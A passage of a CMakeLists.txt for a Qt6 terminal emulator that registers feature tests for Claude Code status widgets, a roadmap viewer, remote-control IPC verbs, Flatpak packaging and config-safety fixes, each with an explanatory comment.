    target_compile_definitions(test_claude_state_dot_palette PRIVATE
        COLOREDTABBAR_H="${CMAKE_CURRENT_SOURCE_DIR}/src/coloredtabbar.h"
        COLOREDTABBAR_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/coloredtabbar.cpp"
        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        CLAUDETABTRACKER_H="${CMAKE_CURRENT_SOURCE_DIR}/src/claudetabtracker.h"
        CLAUDESTATUSWIDGETS_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/claudestatuswidgets.cpp"
    )
    add_test(NAME claude_state_dot_palette
        COMMAND test_claude_state_dot_palette)
    set_tests_properties(claude_state_dot_palette PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_statusbar_extraction — ANTS-1146 (0.7.74). Locks the
    # ClaudeStatusBarController extraction invariants — class
    # declaration shape, public-API + signal byte-for-byte
    # signatures, user-visible labels preserved in the new TU,
    # migrated members no longer referenced in mainwindow.cpp,
    # setup function rename, exactly six controller-connect sites,
    # two-sided LoC anchor. Source-grep only; no Qt link. See
    # tests/features/claude_statusbar_extraction/spec.md and
    # docs/specs/ANTS-1146.md.
    add_executable(test_claude_statusbar_extraction
        tests/features/claude_statusbar_extraction/test_claude_statusbar_extraction.cpp
    )
    target_compile_options(test_claude_statusbar_extraction PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_claude_statusbar_extraction PRIVATE
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAINWINDOW_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_CLAUDESTATUSWIDGETS_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudestatuswidgets.cpp"
        SRC_CLAUDESTATUSWIDGETS_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudestatuswidgets.h"
        SRC_CMAKELISTS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
    )
    add_test(NAME claude_statusbar_extraction
        COMMAND test_claude_statusbar_extraction)
    set_tests_properties(claude_statusbar_extraction PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_task_list — ANTS-1158. User request 2026-05-02:
    # status-bar widget + dialog showing the focused tab's Claude
    # Code task list (TodoWrite snapshot OR TaskCreate / TaskUpdate
    # replay) with status. Hybrid harness — links claudetasklist.cpp
    # for parser-behaviour INVs (1-8); source-greps the wiring sites
    # for INVs 9-13. See tests/features/claude_task_list/spec.md and
    # docs/specs/ANTS-1158.md.
    add_executable(test_claude_task_list
        tests/features/claude_task_list/test_claude_task_list.cpp
        src/claudetasklist.cpp
    )
    target_link_libraries(test_claude_task_list PRIVATE
        Qt6::Core
        Qt6::Test
    )
    target_include_directories(test_claude_task_list PRIVATE src)
    target_compile_options(test_claude_task_list PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME claude_task_list
        COMMAND test_claude_task_list
        WORKING_DIRECTORY ${CMAKE_SOURCE_DIR})
    set_tests_properties(claude_task_list PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_session_freshness — ANTS-1163. User report 2026-05-07:
    # Task List dialog shows tasks from the previous Claude Code
    # session after a fresh launch (reboot + new claude). Root cause:
    # ClaudeIntegration::sessionPathForCwd picks newest .jsonl by
    # mtime alone; a prior session's transcript outranks the new
    # session's empty transcript until the first event lands.
    # Fix: process-start anchored filter + 24h liveness floor.
    # See tests/features/claude_session_freshness/spec.md.
    add_executable(test_claude_session_freshness
        tests/features/claude_session_freshness/test_claude_session_freshness.cpp
        src/claudeintegration.cpp
    )
    target_link_libraries(test_claude_session_freshness PRIVATE
        Qt6::Core
        Qt6::Network
        Qt6::Test
    )
    target_include_directories(test_claude_session_freshness PRIVATE src)
    target_compile_definitions(test_claude_session_freshness PRIVATE
        SRC_CLAUDE_INTEGRATION_CPP_PATH="${CMAKE_SOURCE_DIR}/src/claudeintegration.cpp"
    )
    target_compile_options(test_claude_session_freshness PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME claude_session_freshness
        COMMAND test_claude_session_freshness
        WORKING_DIRECTORY ${CMAKE_SOURCE_DIR})
    set_tests_properties(claude_session_freshness PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # roadmap_viewer — 0.7.39 feature. User request 2026-04-27:
    # status-bar Roadmap button visible iff the active tab's cwd
    # contains a ROADMAP.md (case-insensitive); click opens a
    # filterable dialog with five peer category checkboxes (Done /
    # Planned / In progress / Considered / Currently being tackled).
    # Current-work bullets get a yellow left-border highlight derived
    # from CHANGELOG [Unreleased] + recent git commit subjects. The
    # test is a hybrid source-grep + behavioral harness — links the
    # roadmapdialog.cpp source so the static renderHtml helper can be
    # called against synthetic markdown to verify filter semantics
    # and the highlight CSS marker. See spec.md.
    add_executable(test_roadmap_viewer
        tests/features/roadmap_viewer/test_roadmap_viewer.cpp
        src/roadmapdialog.cpp
        src/coloredtabbar.cpp
        src/themes.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_roadmap_viewer PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_roadmap_viewer PRIVATE src)
    target_compile_options(test_roadmap_viewer PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_roadmap_viewer PRIVATE
        ROADMAPDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.h"
        ROADMAPDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.cpp"
        MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME roadmap_viewer COMMAND test_roadmap_viewer)
    set_tests_properties(roadmap_viewer PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # roadmap_viewer_tabs — ANTS-1100 (0.7.59). Faceted preset tabs +
    # search predicate (with `id:NNNN` shorthand) + larger default
    # size + persisted geometry on RoadmapDialog. 12 invariants across
    # filterFor / sortFor / presetMatching round-trips, descending-
    # chronological section reorder, search filter, and source-greps
    # for the tab strip + persistence wiring. Behavioural assertions
    # link the renderer source so synthetic markdown can be driven
    # through `RoadmapDialog::renderHtml(..., SortOrder, predicate)`
    # without spinning a real dialog. See spec.md.
    add_executable(test_roadmap_viewer_tabs
        tests/features/roadmap_viewer_tabs/test_roadmap_viewer_tabs.cpp
        src/roadmapdialog.cpp
        src/coloredtabbar.cpp
        src/themes.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_roadmap_viewer_tabs PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_roadmap_viewer_tabs PRIVATE src)
    target_compile_options(test_roadmap_viewer_tabs PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_roadmap_viewer_tabs PRIVATE
        ROADMAPDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.h"
        ROADMAPDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.cpp"
    )
    add_test(NAME roadmap_viewer_tabs COMMAND test_roadmap_viewer_tabs)
    set_tests_properties(roadmap_viewer_tabs PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # roadmap_viewer_archive — ANTS-1125 (0.7.61). Per-version
    # archive load path: archiveDirFor() canonical-resolves the
    # archive dir; loadMarkdown() concatenates `<MAJOR>.<MINOR>.md`
    # archives in numeric descending order with thematic-break +
    # HTML-comment sentinel separators; shouldLoadHistory() gates
    # the load on Preset::History or non-empty search. 13 INVs span
    # the static helpers (driven on real temp-dir layouts) and
    # source-greps for the watcher hookup, the IPC-scope guard-rail,
    # and the format-standard amendment. See spec.md.
    add_executable(test_roadmap_viewer_archive
        tests/features/roadmap_viewer_archive/test_roadmap_viewer_archive.cpp
        src/roadmapdialog.cpp
        src/coloredtabbar.cpp
        src/themes.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_roadmap_viewer_archive PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_roadmap_viewer_archive PRIVATE src)
    target_compile_options(test_roadmap_viewer_archive PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_roadmap_viewer_archive PRIVATE
        ROADMAPDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.h"
        ROADMAPDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.cpp"
        ROADMAP_FORMAT_MD="${CMAKE_CURRENT_SOURCE_DIR}/docs/standards/roadmap-format.md"
        SRC_DIR="${CMAKE_CURRENT_SOURCE_DIR}/src"
        ROTATE_ROADMAP_SH="${CMAKE_CURRENT_SOURCE_DIR}/packaging/rotate-roadmap.sh"
    )
    add_test(NAME roadmap_viewer_archive COMMAND test_roadmap_viewer_archive)
    set_tests_properties(roadmap_viewer_archive PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # diffviewer_extraction — ANTS-1145 (0.7.73). Locks the
    # extraction of the Review Changes dialog from
    # MainWindow::showDiffViewer (~430 LoC) into
    # src/diffviewer.{cpp,h}. Pure carve-out, behaviour preserved.
    # Source-grep harness asserts: diffviewer.{h,cpp} exist with
    # the namespace + dialog markers, the post-extraction
    # MainWindow::showDiffViewer body is ≤ 30 LoC and delegates,
    # and mainwindow.cpp no longer carries the migrated markers.
    add_executable(test_diffviewer_extraction
        tests/features/diffviewer_extraction/test_diffviewer_extraction.cpp
    )
    target_compile_options(test_diffviewer_extraction PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_diffviewer_extraction PRIVATE
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_DIFFVIEWER_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/diffviewer.h"
        SRC_DIFFVIEWER_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/diffviewer.cpp"
    )
    add_test(NAME diffviewer_extraction
             COMMAND test_diffviewer_extraction)
    set_tests_properties(diffviewer_extraction PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # roadmap_kind_facets — ANTS-1106 (0.7.64). Locks the
    # Kind-faceted secondary filter in RoadmapDialog. Drives
    # RoadmapDialog::renderHtml across four filter shapes (empty
    # / single Kind / multi Kind / missing-Kind bullet under
    # non-empty filter) and source-greps the dialog setup for
    # the Kind row's QLabel + per-Kind checkbox objectNames.
    add_executable(test_roadmap_kind_facets
        tests/features/roadmap_kind_facets/test_roadmap_kind_facets.cpp
        src/roadmapdialog.cpp
        src/coloredtabbar.cpp
        src/themes.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_roadmap_kind_facets PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_roadmap_kind_facets PRIVATE src)
    target_compile_options(test_roadmap_kind_facets PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_roadmap_kind_facets PRIVATE
        ROADMAPDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.h"
        ROADMAPDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.cpp"
    )
    add_test(NAME roadmap_kind_facets
             COMMAND test_roadmap_kind_facets -platform offscreen)
    set_tests_properties(roadmap_kind_facets PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_roadmap_query — ANTS-1117 v1 (0.7.59). New IPC
    # verb that surfaces the parsed ROADMAP.md as structured JSON
    # to a Claude Code session over the existing remote-control
    # transport. Behavioural test drives RoadmapDialog::parseBullets
    # against synthetic markdown, plus source-grep INVs for the verb
    # registration + cache fields. See spec.md.
    add_executable(test_remote_control_roadmap_query
        tests/features/remote_control_roadmap_query/test_remote_control_roadmap_query.cpp
        src/roadmapdialog.cpp
        src/coloredtabbar.cpp
        src/themes.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_remote_control_roadmap_query PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_remote_control_roadmap_query PRIVATE src)
    target_compile_options(test_remote_control_roadmap_query PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_roadmap_query PRIVATE
        SRC_RC_HEADER="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.h"
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
    )
    add_test(NAME remote_control_roadmap_query
        COMMAND test_remote_control_roadmap_query)
    set_tests_properties(remote_control_roadmap_query PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_tab_list — ANTS-1117 v1 (0.7.59). Source-grep
    # harness for the new `tab-list` IPC verb: verifies dispatch
    # registration, cmdTabList + tabsAsJson wiring, the six expected
    # per-tab keys, and the ClaudeTabTracker integration for
    # claude_running. See spec.md.
    add_executable(test_remote_control_tab_list
        tests/features/remote_control_tab_list/test_remote_control_tab_list.cpp
    )
    target_compile_options(test_remote_control_tab_list PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_tab_list PRIVATE
        SRC_RC_HEADER="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.h"
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME remote_control_tab_list
        COMMAND test_remote_control_tab_list)
    set_tests_properties(remote_control_tab_list PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_engine_extraction — ANTS-1119 v1 (0.7.59). Locks the
    # extraction of pure-data types + applyFilter / parseFindings /
    # capFindings into a Qt6::Core-only `auditengine.{h,cpp}` module.
    # Behavioural INVs drive `AuditEngine::capFindings` and
    # `AuditEngine::parseFindings` directly; structural INVs grep
    # both files for the GUI-include exclusion + the dialog
    # forwarding pattern. See spec.md.
    add_executable(test_audit_engine_extraction
        tests/features/audit_engine_extraction/test_audit_engine_extraction.cpp
        src/auditengine.cpp
    )
    target_link_libraries(test_audit_engine_extraction PRIVATE
        Qt6::Core
    )
    target_include_directories(test_audit_engine_extraction PRIVATE src)
    target_compile_options(test_audit_engine_extraction PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_engine_extraction PRIVATE
        SRC_AUDIT_ENGINE_H="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.h"
        SRC_AUDIT_ENGINE_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.cpp"
        SRC_AUDIT_H="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
        SRC_AUDIT_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
    )
    add_test(NAME audit_engine_extraction
        COMMAND test_audit_engine_extraction)
    set_tests_properties(audit_engine_extraction PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # local_subagent_framework — ANTS-1116 v1 (0.7.59). Behavioural
    # test of `AntsHelper::driftCheck` against synthetic tree
    # fixtures (clean / drift / missing-script / bogus-root) plus a
    # source-grep INV that the CMake `ANTS_ENABLE_HELPER_CLI` option
    # gates the new `ants-helper` binary. See spec.md.
    add_executable(test_local_subagent_framework
        tests/features/local_subagent_framework/test_local_subagent_framework.cpp
        src/antshelper.cpp
    )
    target_link_libraries(test_local_subagent_framework PRIVATE
        Qt6::Core
    )
    target_include_directories(test_local_subagent_framework PRIVATE src)
    target_compile_options(test_local_subagent_framework PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_local_subagent_framework PRIVATE
        SRC_CMAKELISTS="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
    )
    add_test(NAME local_subagent_framework
        COMMAND test_local_subagent_framework)
    set_tests_properties(local_subagent_framework PROPERTIES
        LABELS "features;fast"
        TIMEOUT 15)

    # settings_parse_failure_mirror — 0.7.31 test-coverage fill-in.
    # Mirrors the existing config_parse_failure_guard test for the
    # other two parse-failure refuse sites: ClaudeAllowlist::saveSettings
    # and SettingsDialog's two Claude-hook installers. See
    # tests/features/settings_parse_failure_mirror/spec.md.
    add_executable(test_settings_parse_failure_mirror
        tests/features/settings_parse_failure_mirror/test_settings_parse_failure_mirror.cpp
    )
    target_compile_options(test_settings_parse_failure_mirror PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_settings_parse_failure_mirror PRIVATE
        SRC_CLAUDEALLOWLIST_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeallowlist.cpp"
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME settings_parse_failure_mirror
        COMMAND test_settings_parse_failure_mirror)
    set_tests_properties(settings_parse_failure_mirror PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # flatpak_host_shell — pins the FLATPAK_ID / /.flatpak-info
    # detection + flatpak-spawn --host branch in ptyhandler.cpp. The
    # branch can't be exercised headlessly (no sandbox on CI runners)
    # so a source-grep test locks the argv shape: --host, --env= for
    # every TERM var, --directory= gated on workDir.isEmpty(), -- before
    # the shell path, _exit(127) on execvp failure, direct-exec path
    # intact after the branch. See
    # tests/features/flatpak_host_shell/spec.md.
    add_executable(test_flatpak_host_shell
        tests/features/flatpak_host_shell/test_flatpak_host_shell.cpp
    )
    target_compile_options(test_flatpak_host_shell PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_flatpak_host_shell PRIVATE
        SRC_PTYHANDLER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/ptyhandler.cpp"
    )
    add_test(NAME flatpak_host_shell
             COMMAND test_flatpak_host_shell)
    set_tests_properties(flatpak_host_shell PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # flatpak_lua_module — pins the Lua 5.4 archive module in the
    # Flatpak manifest: module order (must precede ants-terminal),
    # pinned sha256, -fPIC in MYCFLAGS, install to /app, readline-free
    # build target, and the x-checker-data stanza that lets Flathub CI
    # auto-refresh the tarball sha256. A regression that strips any of
    # these silently produces a Flatpak build without plugin support —
    # the exact shipping hazard H6.1 exists to prevent. See
    # tests/features/flatpak_lua_module/spec.md.
    add_executable(test_flatpak_lua_module
        tests/features/flatpak_lua_module/test_flatpak_lua_module.cpp
    )
    target_compile_options(test_flatpak_lua_module PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_flatpak_lua_module PRIVATE
        FLATPAK_MANIFEST_PATH="${CMAKE_CURRENT_SOURCE_DIR}/packaging/flatpak/org.ants.Terminal.yml"
    )
    add_test(NAME flatpak_lua_module
             COMMAND test_flatpak_lua_module)
    set_tests_properties(flatpak_lua_module PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # flathub_manifest_transform — exercises make-flathub-manifest.sh
    # and pins the shape of its output: the dev manifest's `type: dir /
    # path: ../..` is replaced with `type: git / url / tag: vX.Y.Z`,
    # the Lua module survives byte-identical (including sha256 and
    # x-checker-data), the generator auto-detects VERSION from
    # CMakeLists.txt, and it rejects invalid VERSION arguments. A
    # regression here silently ships a broken Flathub manifest on PR.
    # See tests/features/flathub_manifest_transform/spec.md.
    add_executable(test_flathub_manifest_transform
        tests/features/flathub_manifest_transform/test_flathub_manifest_transform.cpp
    )
    target_compile_options(test_flathub_manifest_transform PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_flathub_manifest_transform PRIVATE
        TRANSFORMER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/packaging/flatpak/make-flathub-manifest.sh"
    )
    add_test(NAME flathub_manifest_transform
             COMMAND test_flathub_manifest_transform)
    set_tests_properties(flathub_manifest_transform PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_rule_quality — locks the 0.6.31 self-learning data layer:
    # per-rule fire/suppression aggregation, longest-common-substring
    # tightening suggester, JSON persistence round-trip. Pure model code,
    # no Qt GUI; same approach as osc133_hmac_verification.
    # See tests/features/audit_rule_quality/spec.md.
    add_executable(test_audit_rule_quality
        tests/features/audit_rule_quality/test_audit_rule_quality.cpp
        src/auditrulequality.cpp
    )
    target_link_libraries(test_audit_rule_quality PRIVATE
        Qt6::Core
    )
    target_include_directories(test_audit_rule_quality PRIVATE src)
    target_compile_options(test_audit_rule_quality PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME audit_rule_quality
             COMMAND test_audit_rule_quality)
    set_tests_properties(audit_rule_quality PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_hygiene — locks the 0.7.x external-tool calibration parsers
    # (.semgrep.yml header → --exclude-rule, pyproject.toml S-codes →
    # --skip B-codes). Origin: RetroDB audit-hygiene report 2026-04-21.
    # Pure regex-on-text, so no QtGui / QApplication dependency.
    # See tests/features/audit_hygiene/spec.md.
    add_executable(test_audit_hygiene
        tests/features/audit_hygiene/test_audit_hygiene.cpp
        src/audithygiene.cpp
    )
    target_link_libraries(test_audit_hygiene PRIVATE
        Qt6::Core
    )
    target_include_directories(test_audit_hygiene PRIVATE src)
    target_compile_options(test_audit_hygiene PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME audit_hygiene
             COMMAND test_audit_hygiene)
    set_tests_properties(audit_hygiene PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # feature_coverage — locks the 0.7.x spec↔code drift + CHANGELOG↔test
    # coverage lane parsers (identifier extraction + fuzzy title matching).
    # Follow-on to the RetroDB 2026-04-21 audit-hygiene work — once scanner
    # calibration was tightened, the next signal-loss frontier was specs
    # referencing renamed code and CHANGELOG bullets without tests.
    # Headless: pure text → list, no QtGui.
    # See tests/features/feature_coverage/spec.md.
    add_executable(test_feature_coverage
        tests/features/feature_coverage/test_feature_coverage.cpp
        src/featurecoverage.cpp
    )
    target_link_libraries(test_feature_coverage PRIVATE
        Qt6::Core
    )
    target_include_directories(test_feature_coverage PRIVATE src)
    target_compile_options(test_feature_coverage PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME feature_coverage
             COMMAND test_feature_coverage)
    set_tests_properties(feature_coverage PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_ls — first slice of the 0.8.0 Kitty-style
    # rc_protocol item. Pins the Unix-socket + JSON-envelope shape
    # and the stable field names (`ok`, `tabs`, `index`, `title`,
    # `cwd`, `active`) that rc_protocol clients will depend on.
    # Source-grep test — no GUI, no socket — catches drift at
    # source-edit time rather than waiting for an integration run.
    # See tests/features/remote_control_ls/spec.md.
    add_executable(test_remote_control_ls
        tests/features/remote_control_ls/test_remote_control_ls.cpp
    )
    target_compile_options(test_remote_control_ls PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_ls PRIVATE
        SRC_RC_HEADER="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.h"
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAIN_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
        SRC_CMAKELISTS="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
    )
    add_test(NAME remote_control_ls COMMAND test_remote_control_ls)
    set_tests_properties(remote_control_ls PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_send_text — second rc_protocol command. Locks
    # the "text is required + string" contract, the isDouble-based
    # tab disambiguation (so `--remote-tab 0` stays meaningful), the
    # sendToPty call target, the MainWindow::terminalAtTab public
    # accessor, and the stdin-read client ergonomic. Negative guard
    # against a future regression that auto-appends `\n` to `text`
    # (diverges from Kitty semantics and breaks binary-stream
    # callers). See tests/features/remote_control_send_text/spec.md.
    add_executable(test_remote_control_send_text
        tests/features/remote_control_send_text/test_remote_control_send_text.cpp
    )
    target_compile_options(test_remote_control_send_text PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_send_text PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAIN_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/main.cpp"
    )
    add_test(NAME remote_control_send_text COMMAND test_remote_control_send_text)
    set_tests_properties(remote_control_send_text PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_opt_in — asserts the 0.7.12 /indie-review hardening:
    # (A) behavioral — filterControlChars strips the dangerous C0 subset +
    #     DEL while preserving HT / LF / CR and UTF-8 bytes >= 0x80;
    # (B) behavioral — Config API round-trip for `remote_control_enabled`
    #     (the key the gate reads). Replaces the 0.7.12 grep-for-getter-
    #     name approach, which a rename would silently defeat.
    # (C) structural — raw-bypass + filter calls inside cmdSendText, plus
    #     a regex-based check that start() lives inside a conditional.
    # Closes the local-UID keystroke-injection RCE chain. See
    # tests/features/remote_control_opt_in/spec.md.
    add_executable(test_remote_control_opt_in
        tests/features/remote_control_opt_in/test_remote_control_opt_in.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_remote_control_opt_in PRIVATE
        Qt6::Core
    )
    target_include_directories(test_remote_control_opt_in PRIVATE src)
    target_compile_options(test_remote_control_opt_in PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_opt_in PRIVATE
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME remote_control_opt_in COMMAND test_remote_control_opt_in)
    set_tests_properties(remote_control_opt_in PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # config_parse_failure_guard — asserts the 0.7.12 /indie-review
    # silent-data-loss fix in Config: on parse failure, the corrupt
    # file is rotated aside and save() is suppressed so setters don't
    # clobber the user's hand-fixable config. Also exercises the fresh-
    # run + valid-file happy paths and the std::rename return check.
    # See tests/features/config_parse_failure_guard/spec.md.
    add_executable(test_config_parse_failure
        tests/features/config_parse_failure_guard/test_config_parse_failure.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_config_parse_failure PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_config_parse_failure PRIVATE src)
    target_compile_options(test_config_parse_failure PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME config_parse_failure_guard COMMAND test_config_parse_failure)
    set_tests_properties(config_parse_failure_guard PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # config_reload_loop_safety — locks the 0.7.50 fix for the inotify-
    # driven config-reload loop. onConfigFileChanged used to call
    # applyTheme -> setTheme -> save() unconditionally, which re-entered
    # via inotify because Qt reads inotify events from the event loop
    # *after* the slot returns (so blockSignals during the slot doesn't
    # cover them). The test asserts the idempotent setter, the no-op
    # applyTheme skip, the re-entrancy guard, and the absence of the
    # failed 0.7.31 blockSignals attempt.
    # See tests/features/config_reload_loop_safety/spec.md.
    add_executable(test_config_reload_loop_safety
        tests/features/config_reload_loop_safety/test_config_reload_loop_safety.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_config_reload_loop_safety PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_config_reload_loop_safety PRIVATE src)
    target_compile_options(test_config_reload_loop_safety PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME config_reload_loop_safety
        COMMAND test_config_reload_loop_safety
        WORKING_DIRECTORY ${CMAKE_SOURCE_DIR})
    set_tests_properties(config_reload_loop_safety PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_command_rule_trust — locks the per-project trust store for
    # audit_rules.json rule packs carrying `command` fields. Before
    # 0.7.13 trust was a single global bool, which over-granted after
    # one opt-in. Now trust is keyed on (canonical projectPath, sha256
    # of rule-pack bytes); any edit to the rule pack invalidates trust.
    # A broken gate is silent RCE re-introduction, so this lives on the
    # fast lane. See tests/features/audit_command_rule_trust/spec.md.
    add_executable(test_audit_command_rule_trust
        tests/features/audit_command_rule_trust/test_audit_command_rule_trust.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_audit_command_rule_trust PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_audit_command_rule_trust PRIVATE src)
    target_compile_options(test_audit_command_rule_trust PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME audit_command_rule_trust
             COMMAND test_audit_command_rule_trust)
    set_tests_properties(audit_command_rule_trust PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_new_tab — third rc_protocol command. Locks the
    # cwd + command field forwarding, the 200 ms settle before the
    # command write (matches onSshConnect — shells drop keystrokes
